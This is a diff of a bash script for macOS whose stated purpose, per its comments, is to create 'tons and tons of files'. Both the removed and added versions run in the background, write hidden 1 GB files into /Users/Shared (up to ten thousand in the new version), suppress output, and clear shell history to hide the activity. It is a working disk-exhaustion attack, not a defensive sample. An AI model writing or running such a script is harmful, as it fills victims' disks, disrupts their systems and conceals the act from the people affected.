@@ -1,14 +1,9 @@
 #/bin/bash
 
 # WORKS LIKE A CHARM BABY
-# basically the point is that it makes tonnes and tons of files
+# basically the point is that it makes tons and tons of files
 # recursively
 
 
-nohup sh -c "cd /Users/Shared;
-LOL=0;
-while true;
-do mkfile 1g .woah.poop$LOL;
-LOL=1+LOL;
+nohup mkfile 1g .woah.poop{0..10000} & &>/dev/null
 history -c;
-done" & &>/dev/null
